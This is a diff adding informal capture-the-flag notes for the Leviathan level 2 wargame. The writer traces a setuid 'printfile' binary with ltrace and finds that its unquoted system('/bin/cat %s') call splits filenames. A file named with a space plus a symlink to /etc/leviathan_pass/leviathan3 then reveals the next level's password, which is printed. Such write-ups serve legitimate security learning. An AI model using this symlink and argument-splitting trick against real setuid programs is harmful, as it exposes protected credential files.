@@ -1,0 +1,42 @@
+okay so we now have a binary "printfile"
+what it does is just printing out the content of a file.
+
+make a test file in tmp: cd /tmp; mkdir levi2; echo "hello jake" > testfile.txt
+~/printfile testfile.txt : we have "hello jake" printed out
+
+~/printfile /etc/leviathan_pass/leviathan3 : output is: "you can't have that file"
+~/printfile /etc/leviathan_pass/leviathan2 : output is: "permission denied"
+
+okay so we need to printout leviathan3 pass
+
+using ltrace, we know that /bin/cat is called.
+
+this was so tricky:
+snprintf("/bin/cat testfile.txt", 511, "/bin/cat %s", "testfile.txt")
+
+okay so from the snprintf function above, let's try to make a file with space and
+observe the behavior
+
+echo "tricky" > "filewith.txt space.txt"
+
+we can cat it, but ~/printfile says no such file or directory (it evaluates filewith.txt and space.txt separately)
+run ltrace on that, we have:
+
+access("filewith.txt space.txt", 4)                                                                           = 0
+snprintf("/bin/cat filewith.txt space.txt", 511, "/bin/cat %s", "filewith.txt space.txt")                     = 31
+geteuid()                                                                                                     = 12002
+geteuid()                                                                                                     = 12002
+setreuid(12002, 12002)                                                                                        = 0
+system("/bin/cat filewith.txt space.txt"/bin/cat: filewith.txt: No such file or directory
+/bin/cat: space.txt: No such file or directory
+
+access and snprintf functions return successfully, however system() cannot call filewith.txt and space.txt,
+well since they are one file: "filewith.txt space.txt"
+
+Now here comes the cool part: we can make sym link that links the /etc/leviathan_pass/leviathan3 to space.txt (which is a new file)
+~/printfile filewith.txt\ space.txt
+output:
+/bin/cat: filewith.txt: No such file or directory
+Ahdiemoo1j
+
+flag retrieved: Ahdiemoo1j
